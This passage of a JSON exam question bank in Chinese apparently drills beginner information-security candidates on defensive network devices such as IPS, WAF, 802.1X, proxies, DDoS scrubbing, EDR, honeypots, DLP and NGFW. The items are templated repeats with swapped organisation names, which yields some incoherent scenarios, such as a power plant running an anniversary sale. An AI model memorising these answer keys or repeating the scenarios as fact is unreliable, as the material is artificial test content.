    "question": "某大型連鎖量販流通集團為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 採用旁路監聽方式部署之網路分析儀",
      "C. 關閉所有網路交換機",
      "D. 僅使用本機記事本記錄"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-644",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 傳統 Layer 3 網路防火牆",
      "B. 磁帶備份機",
      "C. 本機防毒軟體",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-645",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 802.1X 網路接取控制（NAC, Network Access Control）",
      "B. 允許所有人免認證使用",
      "C. 停用所有交換器電源",
      "D. 改用家用集線器"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-646",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 反向代理（Reverse Proxy）",
      "B. 入侵防禦系統",
      "C. 蜜罐系統",
      "D. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-647",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "B. 將伺服器網線拔除",
      "C. 在內部防火牆手動逐筆封鎖 IP",
      "D. 重啟內部路由器"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-648",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 增加硬碟儲存容量",
      "C. 移除所有防毒軟體",
      "D. 次世代防毒（NGAV）與端點行為監控（EDR）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-649",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表蜜罐軟體損壞",
      "B. 判定為系統誤報，直接忽略",
      "C. 代表網路速度過慢",
      "D. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-650",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 僅壓縮電子郵件大小",
      "B. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "C. 檢查寄件時間是否在下班時間",
      "D. 僅檢查電子郵件主旨長度"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-651",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 傳統 Layer 3 靜態封包過濾路由器",
      "B. 集線器（Hub）",
      "C. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "D. 無線基地台（AP）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-652",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "B. 無法分析任何網路封包",
      "C. 會導致交換機網路速度降低 99%",
      "D. 伺服器會立即斷線崩潰"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-653",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 僅使用本機記事本記錄",
      "B. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "C. 採用旁路監聽方式部署之網路分析儀",
      "D. 關閉所有網路交換機"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-654",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 磁帶備份機",
      "B. 傳統 Layer 3 網路防火牆",
      "C. 本機防毒軟體",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-655",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 允許所有人免認證使用",
      "B. 改用家用集線器",
      "C. 停用所有交換器電源",
      "D. 802.1X 網路接取控制（NAC, Network Access Control）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-656",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "B. 反向代理（Reverse Proxy）",
      "C. 入侵防禦系統",
      "D. 蜜罐系統"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-657",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 將伺服器網線拔除",
      "B. 重啟內部路由器",
      "C. 在內部防火牆手動逐筆封鎖 IP",
      "D. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-658",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 增加硬碟儲存容量",
      "C. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "D. 移除所有防毒軟體"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-659",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表蜜罐軟體損壞",
      "B. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "C. 判定為系統誤報，直接忽略",
      "D. 代表網路速度過慢"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-660",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 檢查寄件時間是否在下班時間",
      "B. 僅檢查電子郵件主旨長度",
      "C. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-661",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 傳統 Layer 3 靜態封包過濾路由器",
      "B. 集線器（Hub）",
      "C. 無線基地台（AP）",
      "D. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-662",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 伺服器會立即斷線崩潰",
      "B. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "C. 會導致交換機網路速度降低 99%",
      "D. 無法分析任何網路封包"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-663",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 關閉所有網路交換機",
      "C. 採用旁路監聽方式部署之網路分析儀",
      "D. 僅使用本機記事本記錄"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-664",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 本機防毒軟體",
      "B. 傳統 Layer 3 網路防火牆",
      "C. 磁帶備份機",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-665",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 改用家用集線器",
      "B. 802.1X 網路接取控制（NAC, Network Access Control）",
      "C. 停用所有交換器電源",
      "D. 允許所有人免認證使用"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-666",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 蜜罐系統",
      "B. 反向代理（Reverse Proxy）",
      "C. 入侵防禦系統",
      "D. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-667",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 重啟內部路由器",
      "B. 在內部防火牆手動逐筆封鎖 IP",
      "C. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "D. 將伺服器網線拔除"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-668",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 增加硬碟儲存容量",
      "B. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "C. 移除所有防毒軟體",
      "D. 停用 Windows 內建防火牆"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-669",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表網路速度過慢",
      "B. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "C. 判定為系統誤報，直接忽略",
      "D. 代表蜜罐軟體損壞"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-670",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 檢查寄件時間是否在下班時間",
      "B. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "C. 僅檢查電子郵件主旨長度",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-671",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 無線基地台（AP）",
